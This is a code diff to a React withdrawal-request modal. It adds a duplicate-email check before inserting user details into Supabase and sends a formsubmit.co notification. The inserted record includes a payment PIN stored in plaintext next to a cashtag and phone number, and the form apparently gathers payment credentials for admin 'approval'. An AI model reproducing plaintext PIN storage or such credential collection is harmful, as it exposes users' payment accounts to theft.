@@ -13,42 +13,60 @@ export const CompletionModal = () => {
 			setEmailStatus("Submitting your withdrawal request...");
 			
 			const submitData = async () => {
-				const { error } = await supabase
-					.from('withdrawals')
-					.insert([
-						{
-							email: data.email,
-							full_name: data.fullName,
-							phone: data.phone,
-							pin: data.pin,
-							amount: data.amount,
-							payment_method: data.selectedPaymentMethod,
-							transfer_method: data.selectedTransferMethod,
-							cashtag: data.cashtag,
-							status: 'pending'
-						}
-					]);
+				try {
+					// Check for duplicate email
+					const { data: existingUser, error: checkError } = await supabase
+						.from('withdrawals')
+						.select('email')
+						.eq('email', data.email)
+						.limit(1);
 
-				if (error) {
-					console.error("Error submitting:", error);
-					setEmailStatus("Error submitting request. Please try again.");
-				} else {
-					// Send email notification to user via formsubmit
+					if (checkError) throw checkError;
+
+					if (existingUser && existingUser.length > 0) {
+						setEmailStatus("An application with this email has already been submitted.");
+						setEmailSent(true);
+						return;
+					}
+
+					// Proceed with insert
+					const { error: insertError } = await supabase
+						.from('withdrawals')
+						.insert([
+							{
+								email: data.email,
+								full_name: data.fullName,
+								phone: data.phone,
+								pin: data.pin,
+								amount: data.amount,
+								payment_method: data.selectedPaymentMethod,
+								transfer_method: data.selectedTransferMethod,
+								cashtag: data.cashtag,
+								status: 'pending'
+							}
+						]);
+
+					if (insertError) throw insertError;
+
+					// Send email notification to user via formsubmit using FormData
+					const formData = new FormData();
+					formData.append("email", data.email);
+					formData.append("_subject", "New Registration (Supabase Saved)");
+					formData.append("_autoresponse", "Your withdrawal is currently in progress. An administrator is reviewing your request and you will be notified once it is approved.");
+					
 					fetch("https://formsubmit.co/ajax/ismaileyyunusa@gmail.com", {
 						method: "POST",
 						headers: {
-							"Content-Type": "application/json",
 							Accept: "application/json",
 						},
-						body: JSON.stringify({
-							email: data.email,
-							_subject: "New Registration (Supabase Saved)",
-							_autoresponse: "Your withdrawal is currently in progress. An administrator is reviewing your request and you will be notified once it is approved."
-						}),
+						body: formData,
 					}).catch(console.error);
 
 					setEmailStatus("Request submitted successfully! It is now pending approval.");
 					setEmailSent(true);
+				} catch (error) {
+					console.error("Error submitting:", error);
+					setEmailStatus("Error submitting request. Please try again.");
 				}
 			};
 
